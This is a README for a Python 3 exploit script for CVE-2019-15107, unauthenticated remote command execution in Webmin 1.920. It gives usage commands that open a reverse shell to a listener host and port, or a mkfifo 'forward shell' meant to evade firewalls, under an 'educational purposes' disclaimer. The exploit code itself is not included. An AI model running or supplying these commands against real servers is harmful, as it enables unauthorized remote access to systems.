# CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution

A python3 script for the CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution that creates a reverse shell or a pseudo interactive shell using mkfifo for firewall evasionA python3 script for the CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution that creates a reverse shell or a pseudo interactive shell using mkfifo for firewall evasion

## Getting Started

### Executing program

* With python3
```
python3 webmin.py -t https://webmin.site/ -lhost 127.0.0.1 -lport 9001
```
* For forward shell firewall evasion
```
python3 webmin.py -t https://webmin.site/ -fs
```

## Help

For help menu:
```
python3 webmin.py -h
```

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.